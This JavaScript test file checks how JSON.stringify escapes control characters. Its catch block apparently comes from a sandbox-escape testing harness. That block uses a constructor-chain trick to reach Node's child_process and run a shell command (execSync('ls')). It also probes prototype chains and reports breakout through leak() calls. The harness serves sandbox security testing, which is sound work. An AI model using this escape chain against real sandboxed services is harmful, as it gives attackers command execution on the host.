try {
    var char_to_json = {
        '"': '\\"',
        '\\': '\\\\',
        '\0': '\\u0000',
        '\x01': '\\u0001',
        '\x02': '\\u0002',
        '\x03': '\\u0003',
        '\x04': '\\u0004',
        '\x05': '\\u0005',
        '\x06': '\\u0006',
        '\x07': '\\u0007',
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\x0B': '\\u000b',
        '\f': '\\f',
        '\r': '\\r',
        '\x0E': '\\u000e',
        '\x0F': '\\u000f',
        '\x10': '\\u0010',
        '\x11': '\\u0011',
        '\x12': '\\u0012',
        '\x13': '\\u0013',
        '\x14': '\\u0014',
        '\x15': '\\u0015',
        '\x16': '\\u0016',
        '\x17': '\\u0017',
        '\x18': '\\u0018',
        '\x19': '\\u0019',
        '\x1A': '\\u001a',
        '\x1B': '\\u001b',
        '\x1C': '\\u001c',
        '\x1D': '\\u001d',
        '\x1E': '\\u001e',
        '\x1F': '\\u001f'
    };
    var chars = Object.keys(char_to_json).join('');
    var chars_reversed = Object.keys(char_to_json).reverse().join('');
    var jsonChars = Object.values(char_to_json).join('');
    var jsonChars_reversed = Object.values(char_to_json).reverse().join('');
    var json = JSON.stringify({ ['name' + chars + chars_reversed]: chars_reversed + chars + 'value' });
    for (var char in char_to_json) {
        var count = json.split(char_to_json[char]).length - 1;
        assert.sameValue(count, 4, 'Every ASCII 0x' + char.charCodeAt(0).toString(16) + ' serializes to ' + char_to_json[char]);
    }
    assert.sameValue(json, `{"${ 'name' + jsonChars + jsonChars_reversed }":"${ jsonChars_reversed + jsonChars + 'value' }"}`, 'JSON.stringify(objectUsingControlCharacters)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}